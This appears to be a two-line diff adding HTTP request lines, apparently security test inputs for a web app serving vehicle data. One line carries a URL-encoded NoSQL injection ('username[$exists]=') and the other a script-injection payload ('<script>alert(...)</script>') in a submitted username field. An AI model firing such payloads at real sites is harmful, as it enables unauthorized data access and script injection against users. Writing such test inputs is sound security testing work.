@@ -1,0 +1,2 @@
+GET  /vehicle.json?username%5B%24exists%5D%3D
+POST /submit?username=<script>alert("hacked!");</script>&lat=100&lng=100 
